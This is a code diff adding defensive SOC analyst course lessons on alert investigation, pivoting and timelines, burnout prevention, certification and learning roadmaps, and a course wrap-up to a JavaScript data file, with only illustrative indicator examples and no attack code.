+### The 10,000 Alert Rule
+
+Like any skill, investigation improves with practice:
+
+\`\`\`
+PROGRESSION PATH
+
+First 100 alerts:
+├── Learning tools and interfaces
+├── Following playbooks exactly
+├── High dependence on documentation
+└── Everything takes time
+
+First 1,000 alerts:
+├── Recognizing common patterns
+├── Faster triage decisions
+├── Starting to spot anomalies
+└── Building intuition
+
+10,000+ alerts:
+├── Instant pattern recognition
+├── Deep technical understanding
+├── Complex investigation skills
+└── Mentoring newer analysts
+\`\`\`
+
+## Practical Investigation Techniques
+
+### Pivoting
+
+\`\`\`
+PIVOT FROM ONE INDICATOR TO FIND MORE
+
+Start: Suspicious IP 185.234.218.45
+
+Pivot 1: What domains resolve to this IP?
+└─ evil-c2.com, malware-drop.net
+
+Pivot 2: What other IPs do these domains use?
+└─ 185.234.218.45, 91.109.190.68
+
+Pivot 3: What hosts communicated with these IPs?
+└─ WORKSTATION-08, FINANCE-PC-12
+
+Pivot 4: What else did these hosts do?
+└─ Executed suspicious PowerShell
+└─ Created new scheduled tasks
+\`\`\`
+
+### Timeline Building
+
+\`\`\`
+RECONSTRUCT THE ATTACK TIMELINE
+
+[09:15:22] Phishing email received
+[09:22:35] User opens attachment
+[09:22:37] Word macro executes
+[09:22:38] PowerShell downloads payload
+[09:22:45] Persistence established
+[09:23:01] C2 beacon starts
+[09:25:00] DETECTED by EDR
+
+Questions to Ask:
+• What happened before detection?
+• What might have happened after?
+• Are there gaps in our visibility?
+\`\`\`
+
+### Scope Determination
+
+\`\`\`
+ASSESSING INCIDENT SCOPE
+
+Start with: One affected system
+
+Expand Investigation:
+├── What did this system communicate with?
+├── Were credentials used on other systems?
+├── Did malware spread to other hosts?
+├── What data was accessed?
+└── How long was the attacker present?
+
+Scope Matrix:
+           ┌─────────────┬─────────────┐
+           │ Same Time   │ Diff Time   │
+├──────────┼─────────────┼─────────────┤
+│ Same Sys │ Same event  │ Persistence │
+├──────────┼─────────────┼─────────────┤
+│ Diff Sys │ Spreading   │ Campaign    │
+└──────────┴─────────────┴─────────────┘
+\`\`\`
+
+## Documentation Habits
+
+### Investigation Notes
+
+\`\`\`
+GOOD INVESTIGATION NOTES
+
+[14:22:35] Alert received - PowerShell execution on FINANCE-PC-08
+[14:23:00] Reviewed alert - encoded command detected
+[14:25:00] Decoded command - downloads from 185.234.218.45
+[14:27:00] Checked VirusTotal - IP flagged as malware
+[14:30:00] Checked EDR - process tree shows Word→PowerShell
+[14:32:00] Verdict: True positive - malware delivery
+[14:35:00] Initiated containment - isolated host
+
+WHY THIS MATTERS:
+• You can pick up where you left off
+• Others can understand your reasoning
+• Supports post-incident review
+• May be needed for legal proceedings
+\`\`\`
+
+## Continuous Improvement
+
+\`\`\`
+GROWING AS AN ANALYST
+
+Daily:
+├── Learn from each alert you investigate
+├── Ask "why" for things you don't understand
+└── Document new techniques and IOCs
+
+Weekly:
+├── Review recent threat intelligence
+├── Catch up on security news
+└── Practice with labs and CTFs
+
+Monthly:
+├── Deep dive into one topic
+├── Work on certifications
+└── Share knowledge with team
+
+Annually:
+├── Attend conferences (virtual counts!)
+├── Take formal training
+└── Set career development goals
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Investigation requires a detective's mindset: observe, hypothesize, test, conclude",
+      "Avoid cognitive biases by actively seeking contradicting evidence",
+      "Pivoting from one indicator helps uncover the full scope of an attack",
+      "Building timelines reconstructs the attack sequence",
+      "Document everything - your notes support continuity and learning"
+    ],
+    practicalExercise: {
+      title: "Investigation Skills Practice",
+      description: "Work through investigation scenarios to build analytical skills.",
+      steps: [
+        "Take a provided alert and list your initial observations",
+        "Generate three hypotheses that could explain the alert",
+        "Identify what evidence you'd need to test each hypothesis",
+        "Practice pivoting from the initial IOC to find related indicators",
+        "Build a timeline of the scenario events"
+      ]
+    }
+  },
+  {
+    id: "10.2",
+    courseId: "soc-fundamentals",
+    title: "Avoiding Analyst Burnout",
+    content: `
+# Avoiding Analyst Burnout
+
+SOC work is demanding. Alert fatigue, shift work, and constant pressure can lead to burnout. Recognizing and preventing burnout is essential for career longevity.
+
+## Understanding SOC Burnout
+
+### What is Burnout?
+
+\`\`\`
+BURNOUT SYMPTOMS
+
+Physical:
+├── Chronic fatigue
+├── Insomnia or sleep issues
+├── Frequent illness
+└── Headaches, muscle tension
+
+Emotional:
+├── Cynicism about work
+├── Feeling ineffective
+├── Loss of motivation
+├── Emotional exhaustion
+
+Behavioral:
+├── Decreased performance
+├── Increased mistakes
+├── Isolation from colleagues
+└── Neglecting personal responsibilities
+\`\`\`
+
+### SOC-Specific Stressors
+
+| Stressor | Description |
+|----------|-------------|
+| Alert Fatigue | Thousands of alerts, many false positives |
+| Shift Work | Irregular hours, night shifts, weekends |
+| High Stakes | Mistakes can have serious consequences |
+| Constant Learning | Always new threats, tools, techniques |
+| Underappreciated | Security is invisible when it works |
+| Resource Constraints | Understaffed, underfunded |
+
+## Prevention Strategies
+
+### Work-Life Balance
+
+\`\`\`
+HEALTHY BOUNDARIES
+
+At Work:
+├── Take your breaks (seriously!)
+├── Step away from screens regularly
+├── Don't skip lunch for alerts
+└── Use vacation time
+
+Off Work:
+├── Disconnect from work communications
+├── Have non-security hobbies
+├── Exercise regularly
+├── Maintain social connections
+└── Get adequate sleep
+
+Mental Shift:
+├── "Not everything is an emergency"
+├── "The SOC will survive without me for a break"
+├── "My health enables my effectiveness"
+\`\`\`
+
+### Managing Alert Fatigue
+
+\`\`\`
+COMBATING ALERT FATIGUE
+
+Tactical:
+├── Advocate for alert tuning
+├── Push for automation of routine tasks
+├── Request better tooling when needed
+├── Escalate unsustainable alert volumes
+
+Personal:
+├── Use the Pomodoro technique
+├── Vary your tasks when possible
+├── Take micro-breaks between alerts
+└── Celebrate closing tickets (small wins!)
+
+Team:
+├── Rotate high-intensity tasks
+├── Support colleagues during spikes
+├── Share knowledge to reduce individual burden
+└── Maintain team morale
+\`\`\`
+
+### Shift Work Survival
+
+\`\`\`
+HEALTHY SHIFT WORK PRACTICES
+
+Before Night Shifts:
+├── Sleep in before your shift
+├── Avoid caffeine 6+ hours before sleep
+└── Prepare meals in advance
+
+During Night Shifts:
+├── Stay hydrated
+├── Light healthy snacks
+├── Use bright lighting to stay alert
+├── Short walks or stretches
+
+After Night Shifts:
+├── Wear sunglasses going home
+├── Blackout curtains for sleeping
+├── White noise for day sleeping
+└── Don't force yourself awake
+
+Rotation Tips:
+├── Gradual schedule adjustment
+├── Keep some consistent routines
+└── Prioritize sleep above all
+\`\`\`
+
+## Building Resilience
+
+### Mental Health Resources
+
+\`\`\`
+SUPPORT OPTIONS
+
+Personal:
+├── Talk to trusted friends/family
+├── Maintain hobbies and interests
+├── Practice stress reduction (meditation, exercise)
+
+Professional:
+├── Employee Assistance Programs (EAP)
+├── Mental health professionals
+├── Peer support groups
+
+Community:
+├── Security community mentors
+├── Online forums and Discord servers
+├── Local meetup groups
+\`\`\`
+
+### Knowing When to Ask for Help
+
+Signs it's time to seek support:
+- Feeling overwhelmed most days
+- Difficulty sleeping or oversleeping
+- Changes in appetite
+- Loss of interest in things you enjoyed
+- Difficulty concentrating
+- Feeling hopeless or worthless
+- Thoughts of self-harm
+
+> "Asking for help is a sign of strength, not weakness."
+
+## Career Sustainability
+
+### Long-Term SOC Career
+
+\`\`\`
+SUSTAINABLE CAREER PRACTICES
+
+Skill Development:
+├── Continuous learning prevents stagnation
+├── Seek varied experiences
+├── Consider specialization paths
+└── Mentor others (helps you too!)
+
+Career Progression:
+├── L1 → L2 → L3 pathway
+├── Specializations (threat intel, IR, hunting)
+├── Move to detection engineering
+├── Leadership opportunities
+
+Knowing When to Move:
+├── Burnout that doesn't improve
+├── Toxic work environment
+├── No growth opportunities
+├── Better opportunities elsewhere
+\`\`\`
+
+### Team Culture
+
+A healthy SOC has:
+- **Psychological safety** - OK to make mistakes
+- **Workload management** - Sustainable alert volumes
+- **Recognition** - Wins are celebrated
+- **Growth focus** - Learning is prioritized
+- **Support** - Team helps each other
+    `,
+    keyTakeaways: [
+      "Burnout is a real risk in SOC work due to stress and alert fatigue",
+      "Setting work-life boundaries is essential for long-term sustainability",
+      "Shift work requires specific strategies for sleep and health",
+      "Asking for help is a sign of strength, not weakness",
+      "A healthy team culture helps prevent individual burnout"
+    ],
+    additionalResources: [
+      { title: "Mental Health Resources", type: "article", url: "https://www.mentalhealth.gov" },
+      { title: "SOC Analyst Wellbeing Guide", type: "article", url: "https://www.sans.org" }
+    ]
+  },
+  {
+    id: "10.3",
+    courseId: "soc-fundamentals",
+    title: "Continuous Learning Path",
+    content: `
+# Continuous Learning Path
+
+The cybersecurity field evolves constantly. A commitment to continuous learning is essential for staying effective and advancing your career.
+
+## Learning Roadmap
+
+### SOC Analyst Career Progression
+
+\`\`\`
+TYPICAL SOC CAREER PATH
+
+Level 1 Analyst (0-2 years)
+├── Alert triage and monitoring
+├── Following playbooks
+├── Basic investigation
+├── Documentation
+└── Learning tools and processes
+
+Level 2 Analyst (2-4 years)
+├── Deep investigation
+├── Escalation handling
+├── Mentoring L1 analysts
+├── Playbook development
+└── Tool customization
+
+Level 3 Analyst / Senior (4-7 years)
+├── Complex incident response
+├── Threat hunting
+├── Detection engineering
+├── Process improvement
+└── Strategic planning
+
+Specialization Paths:
+├── Threat Intelligence
+├── Incident Response
+├── Threat Hunting
+├── Detection Engineering
+├── Security Architecture
+├── Management
+└── Red Team/Penetration Testing
+\`\`\`
+
+## Certification Roadmap
+
+### Entry Level
+
+| Certification | Focus | Study Time |
+|---------------|-------|------------|
+| CompTIA Security+ | Broad security fundamentals | 2-3 months |
+| Google Cybersecurity | Entry-level skills | 3-6 months |
+| SC-900 | Microsoft security basics | 1-2 months |
+
+### SOC Focused
+
+| Certification | Focus | Study Time |
+|---------------|-------|------------|
+| Blue Team Level 1 (BTL1) | SOC analyst skills | 2-3 months |
+| CySA+ | Security analyst | 3-4 months |
+| SC-200 | Microsoft Defender | 2-3 months |
+| Splunk Core | SIEM fundamentals | 2-3 months |
+
+### Advanced
+
+| Certification | Focus | Study Time |
+|---------------|-------|------------|
+| Blue Team Level 2 (BTL2) | Advanced defense | 4-6 months |
+| GCIH | Incident handling | 4-6 months |
+| GCFA | Forensic analyst | 4-6 months |
+| OSCP | Penetration testing | 6-12 months |
+
+## Free Learning Resources
+
+### Hands-On Labs
+
+\`\`\`
+FREE PRACTICE PLATFORMS
+
+TryHackMe
+├── SOC Level 1 path
+├── Threat Intelligence path
+├── Incident Response path
+└── Great for beginners
+
+LetsDefend
+├── SOC analyst challenges
+├── Real-world alert simulations
+├── Malware analysis labs
+└── Blue team focused
+
+CyberDefenders
+├── Blue team challenges
+├── Memory forensics
+├── Network analysis
+└── Intermediate-advanced
+
+Blue Team Labs Online
+├── Incident response labs
+├── Threat hunting exercises
+├── Detection engineering
+└── Subscription-based (some free)
+\`\`\`
+
+### Learning Content
+
+\`\`\`
+FREE LEARNING RESOURCES
+
+Video Content:
+├── John Hammond (YouTube)
+├── The Cyber Mentor
+├── NetworkChuck
+├── Professor Messer
+└── SANS webcasts
+
+Blogs & Articles:
+├── SANS Reading Room
+├── Red Canary blog
+├── Mandiant blog
+├── DFIR reports
+└── Medium security writers
+
+Podcasts:
+├── Darknet Diaries
+├── Risky Business
+├── Security Now
+├── SANS Internet Stormcast
+└── Smashing Security
+\`\`\`
+
+## Staying Current
+
+### Daily Habits
+
+\`\`\`
+DAILY LEARNING ROUTINE (15-30 min)
+
+Morning:
+├── Check security news
+│   ├── BleepingComputer
+│   ├── The Hacker News
+│   └── Krebs on Security
+│
+├── Review threat intel
+│   ├── CISA alerts
+│   ├── Vendor advisories
+│   └── Twitter/X security community
+
+During Work:
+├── Learn from each alert
+├── Ask questions about unfamiliar things
+├── Document new techniques
+
+Evening (optional):
+├── Watch one educational video
+├── Read one blog post
+├── Practice one small lab
+\`\`\`
+
+### Weekly/Monthly
+
+\`\`\`
+STRUCTURED LEARNING
+
+Weekly:
+├── Deep dive on one topic (1-2 hours)
+├── Complete one lab or challenge
+├── Review and update notes
+
+Monthly:
+├── Work on certification progress
+├── Attend a webinar or virtual event
+├── Share something learned with team
+
+Quarterly:
+├── Assess skills gaps
+├── Update learning plan
+├── Set new goals
+\`\`\`
+
+## Building Your Network
+
+### Community Involvement
+
+\`\`\`
+CYBERSECURITY COMMUNITY
+
+Online:
+├── Discord servers (TryHackMe, HackTheBox, etc.)
+├── Reddit (r/cybersecurity, r/netsec)
+├── Twitter/X security community
+└── LinkedIn security groups
+
+Local:
+├── Security meetups (BSides, ISSA, OWASP)
+├── Local infosec groups
+├── User groups (Splunk, etc.)
+
+Benefits:
+├── Learn from others' experiences
+├── Career opportunities
+├── Mentorship possibilities
+├── Stay motivated
+└── Give back to others
+\`\`\`
+    `,
+    keyTakeaways: [
+      "SOC careers progress from L1 through specializations and leadership",
+      "Certifications validate skills - start with Security+ or BTL1",
+      "Free platforms like TryHackMe and LetsDefend provide hands-on practice",
+      "Daily learning habits compound into significant growth over time",
+      "Community involvement accelerates learning and opens opportunities"
+    ],
+    additionalResources: [
+      { title: "TryHackMe", type: "tool", url: "https://tryhackme.com" },
+      { title: "LetsDefend", type: "tool", url: "https://letsdefend.io" },
+      { title: "CyberDefenders", type: "tool", url: "https://cyberdefenders.org" }
+    ]
+  },
+  {
+    id: "10.4",
+    courseId: "soc-fundamentals",
+    title: "Course Summary & Next Steps",
+    content: `
+# Course Summary & Next Steps
+
+Congratulations on completing Blue Team & SOC Fundamentals! Let's review what you've learned and plan your next steps.
+
+## What You've Learned
+
+### Module 1: Introduction to Security Operations
+\`\`\`
+✓ SOC mission and core functions
+✓ Team roles and responsibilities
+✓ Essential SOC tools and technologies
+✓ Workflows and shift handover procedures
+\`\`\`
+
+### Module 2: Cyber Threat Landscape
+\`\`\`
+✓ Threat actors and their motivations
+✓ Common attack vectors
+✓ Malware categories and behavior
+✓ MITRE ATT&CK framework basics
+\`\`\`
+
+### Module 3: Log Analysis Fundamentals
+\`\`\`
+✓ Why logs matter for security
+✓ Windows Event Log analysis
+✓ Linux log analysis
+✓ Network device logs
+\`\`\`
+
+### Module 4: SIEM Fundamentals
+\`\`\`
+✓ SIEM architecture and capabilities
+✓ Dashboard and interface navigation
+✓ Writing search queries
+✓ Understanding correlation rules
+\`\`\`
+
+### Module 5: Alert Triage & Analysis
+\`\`\`
+✓ Alert anatomy and severity
+✓ The triage process
+✓ True vs false positive determination
+✓ Documentation and escalation
+\`\`\`
+
+### Module 6: Threat Intelligence Basics
+\`\`\`
+✓ Types of threat intelligence
+✓ IOC types and usage
+✓ OSINT techniques
+✓ Threat intel platforms
+\`\`\`
+
+### Module 7: Incident Response Introduction
+\`\`\`
+✓ IR lifecycle (NIST framework)
+✓ Incident classification and severity
+✓ Containment strategies
+✓ Documentation and communication
+\`\`\`
+
+### Module 8: Endpoint Detection & Response
+\`\`\`
+✓ EDR capabilities and architecture
+✓ Alerts and telemetry analysis
+✓ Process tree analysis
+✓ Investigation techniques
+\`\`\`
+
+### Module 9: Network Security Monitoring
+\`\`\`
+✓ Network fundamentals for SOC
+✓ IDS/IPS systems
+✓ Traffic analysis techniques
+✓ Common network attacks
+\`\`\`
+
+### Module 10: SOC Analyst Best Practices
+\`\`\`
+✓ Investigation skills development
+✓ Avoiding burnout
+✓ Continuous learning paths
+✓ Career development
+\`\`\`
+
+## Skills Self-Assessment
+
+Rate your confidence in each area:
+
+\`\`\`
+SKILL ASSESSMENT
+
+1 = Need more practice
+2 = Basic understanding
+3 = Comfortable
+4 = Confident
+5 = Could teach others
+
+□ Alert triage and prioritization     [  ]
+□ Log analysis (Windows/Linux)        [  ]
+□ SIEM navigation and queries         [  ]
+□ IOC research and validation         [  ]
+□ Process tree analysis               [  ]
+□ Network traffic analysis            [  ]
+□ Incident documentation              [  ]
+□ Escalation decisions                [  ]
+
+Focus your next learning on areas rated 1-2
+\`\`\`
+
+## Recommended Next Steps
+
+### Immediate (Next 30 Days)
+
+\`\`\`
+ACTION ITEMS
+
+1. Practice What You Learned
+   ├── Complete the hands-on exercises
+   ├── Do 10 challenges on TryHackMe SOC path
+   └── Practice in LetsDefend simulator
+
+2. Build Your Lab
+   ├── Set up a home lab (VirtualBox/VMware)
+   ├── Install Windows VM for log analysis
+   ├── Practice with SIEM (Splunk free, ELK)
+   └── Try open-source EDR (Wazuh, Velociraptor)
+
+3. Get Certified
+   ├── Register for first certification exam
+   ├── BTL1 or Security+ recommended
+   └── Create a study schedule
+\`\`\`
+
+### Medium Term (3-6 Months)
+
+\`\`\`
+CAREER DEVELOPMENT
+
+Skills:
+├── Deepen SIEM expertise (specific platform)
+├── Learn scripting (Python for security)
+├── Practice malware analysis basics
+└── Study network forensics
+
+Experience:
+├── Apply for entry-level SOC positions
+├── Seek internships if available
+├── Contribute to open-source projects
+└── Participate in CTF competitions
+
+Networking:
+├── Join security Discord servers
+├── Attend local security meetups
+├── Connect with professionals on LinkedIn
+└── Find a mentor
+\`\`\`
+
+### Long Term (1-2 Years)
+
+\`\`\`
+CAREER PATH OPTIONS
+
+Generalist Path:
+L1 Analyst → L2 Analyst → L3 Analyst → IR Lead
+
+Specialist Paths:
+├── Threat Intelligence: CTI Analyst → TI Lead
+├── Incident Response: IR Analyst → IR Lead
+├── Threat Hunting: Hunter → Hunt Lead
+├── Detection Engineering: Det Engineer → Lead
+└── Management: Team Lead → SOC Manager
+
+Advanced Certifications:
+├── GCIH (Incident Handler)
+├── GCFA (Forensic Analyst)
+├── OSCP (Penetration Testing)
+└── CISSP (Security Management)
+\`\`\`
+
+## Final Advice
+
+### From Security Professionals
+
+> "Stay curious. The best analysts are the ones who always ask 'why?'"
+
+> "It's okay not to know everything. The skill is knowing how to find the answer."
+
+> "Take care of yourself. Burnout is real, and you can't protect others if you're broken."
+
+> "Share your knowledge. Teaching others is the best way to solidify your own understanding."
+
+> "The threat actors never stop learning. Neither should you."
+
+## Keep in Touch
+
+\`\`\`
+CONTINUE YOUR JOURNEY
+
+Practice Platforms:
+├── TryHackMe: tryhackme.com
+├── LetsDefend: letsdefend.io
+├── CyberDefenders: cyberdefenders.org
+
+Community:
+├── InfoSecDairies Telegram: @infosecdairiess
+├── Discord security servers
+├── Local security meetups
+
+Stay Updated:
+├── Security news sites
+├── Vendor blogs and research
+├── Twitter/X security community
+\`\`\`
+
+---
+
+## 🎉 Congratulations!
+
+You've completed **Blue Team & SOC Fundamentals**!
+
+You now have the knowledge foundation to:
+- Work as an entry-level SOC analyst
+- Triage and investigate security alerts
+- Use SIEM, EDR, and other SOC tools
+- Contribute to incident response efforts
+- Continue growing in your security career
+
+**What's next?** Take the final certification exam to validate your knowledge, then start applying what you've learned!
+
+Welcome to the blue team. The defenders need you. 🛡️
+    `,
+    keyTakeaways: [
+      "You've built a solid foundation across all core SOC analyst skills",
+      "Self-assessment helps identify areas for focused improvement",
+      "Hands-on practice through labs and CTFs reinforces learning",
+      "Career progression comes from continuous learning and specialization",
+      "The security community is supportive - engage and give back"
+    ],
+    practicalExercise: {
+      title: "Create Your Learning Plan",
+      description: "Develop a personalized plan for continued growth.",
+      steps: [
+        "Complete the skills self-assessment honestly",
+        "Identify your top 3 areas for improvement",
+        "Choose your first certification goal",
+        "Sign up for at least one practice platform",
+        "Schedule 30 minutes of daily learning time"
+      ]
+    }
   }
 ];
 
